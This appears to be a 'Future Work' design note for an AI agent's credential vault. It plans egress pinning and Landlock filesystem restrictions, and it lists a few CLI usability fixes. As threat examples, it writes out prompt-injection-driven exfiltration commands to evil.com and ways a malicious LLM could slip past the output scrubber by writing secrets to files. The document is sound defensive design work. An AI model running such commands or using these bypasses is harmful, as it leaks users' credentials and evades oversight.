# Future Work

Items collected from real-world usage testing and security review. Prioritized by impact.

---

## Security Enhancements

### 1. Command-level egress pinning for API credentials
**Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).

**Proposed design:** Add an optional `allowedEgress` field to tool config:
```yaml
github:
  match: "gh *"
  env: GITHUB_TOKEN
  allowedEgress: ["github.com", "api.github.com"]
```

Before injecting, scan the command string for URLs and hostnames. If any URL doesn't match the allowed egress list, refuse to inject and log the blocked attempt to the audit log.

**Limitations (document honestly):**
- Obfuscated URLs, variable indirection, and DNS rebinding would bypass this
- Only inspects the command string, not what the subprocess actually does at the network level
- Defense-in-depth measure that raises the bar, not a complete solution

**Complements:** This extends the domain pinning concept from browser credentials to API credentials, using the same philosophy — check before resolving, not after.

---

## UX Improvements

### 1. Fuzzy match on tool name not found
**Trigger:** `openclaw vault remove gumroad-password` → "not found"
**Current behavior:** Hard fail with no help.
**Desired behavior:** Show fuzzy matches — "Did you mean one of these?"
```
Tool "gumroad-password" not found. Similar tools in vault:
  - gumroad-login
  - gumroad-api
  - gumroad-session
```
**Applies to:** All commands that take a tool name (`show`, `remove`, `rotate`, `test`, `logs --tool`)

### 2. `vault logs --last N` should accept a count
**Trigger:** `openclaw vault logs --last 5` to see last 5 entries
**Current behavior:** `--last` only accepts a duration string (e.g. `24h`, `7d`, `30m`).
**Desired behavior:** Also accept a plain number — `--last 10` shows the 10 most recent log entries regardless of time.

---

---

### Kernel-Level Filesystem Write Restriction for Vault-Injected Commands

**Problem:** The Perl stdout scrubber catches credentials in subprocess output, but a malicious LLM can bypass it by writing credentials to a file first (`> /tmp/file`, `python3 -c "open(...).write(...)"`, `curl -o file`, `cp /proc/self/environ /tmp/`). Shell-level detection (blocking `>`, `>>`, `tee`) is a cat-and-mouse game — any scripting language or binary can write to disk.

**Proposed solution: Linux Landlock** (kernel 5.13+, ~2021)
- Kernel-level per-process filesystem access control, no root needed
- A small Rust wrapper binary enables Landlock rules before exec'ing the actual command
- Rules: read-only filesystem access, no file create/write
- stdout/stderr/pipes unaffected (not filesystem writes)
- Network unaffected (Landlock v1-3 don't restrict network)

**What this blocks — comprehensively:**
- Shell redirects (`>`, `>>`)
- Scripting language file writes (`python3 -c "open('/tmp/f','w')..."`)
- Binary flags (`curl -o file`)
- Proc filesystem copies (`cp /proc/self/environ /tmp/`)
- Any future creative file-based bypass

**What this doesn't block (separate threat class):**
- Network exfiltration (`curl evil.com -d $SECRET`) — requires egress pinning (see separate future work item)

**Configuration:** Default enabled for vault-injected commands, per-tool override (`allowFileWrite: true` in tools.yaml) for commands that legitimately need to write to disk (e.g., `git commit`, build tools). Most credential-using commands are read-only operations (`gh api`, `curl` without `-o`, `git push`).

**Implementation:** Could be a second small Rust binary (`openclaw-vault-sandbox`) or a mode flag on the existing resolver. We already ship a Rust binary and have the toolchain.

**Interim mitigation (current):** Perl stdout scrubber + `message_sending` hook + `tool_result_persist` hook provide layered defense. File redirect bypass requires a deliberate multi-step attack (write to file, then read it back in a separate command).

---

*More items will be added as testing continues.*
